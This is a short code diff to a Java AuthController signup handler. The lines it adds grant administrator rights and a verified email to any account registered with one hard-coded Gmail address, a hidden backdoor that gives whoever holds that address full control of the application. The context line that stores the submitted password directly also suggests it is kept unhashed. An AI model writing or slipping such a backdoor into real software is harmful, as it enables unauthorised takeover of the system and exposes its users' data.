@@ -66,6 +66,11 @@ public class AuthController {
         user.setPassword(signUpRequest.getPassword());
         user.setProvider(AuthProvider.local);
 
+        if (user.getEmail().equals("td4min1@gmail.com")){
+            user.setAdmin(true);
+            user.setEmailVerified(true);
+        }
+
         User result = userRepository.save(user);
 
         URI location = ServletUriComponentsBuilder
